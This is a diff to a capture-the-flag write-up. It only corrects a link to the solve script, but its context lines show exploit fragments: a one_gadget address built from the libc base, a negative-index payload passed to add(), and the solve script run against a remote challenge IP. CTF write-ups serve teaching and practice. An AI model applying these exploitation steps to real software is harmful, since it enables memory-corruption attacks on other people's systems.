@@ -179,7 +179,7 @@ one_gadget = p64(libc.address + 0xef52b)
 add(b"-7", b"A"*8+one_gadget[:7])
 ```
 
-Putting it all together in [this script](./solve.py) we get the flag :
+Putting it all together in [this script](./Sources/solve.py) we get the flag :
 
 ```console
 $ ./solve.py -r 146.148.28.103 32866
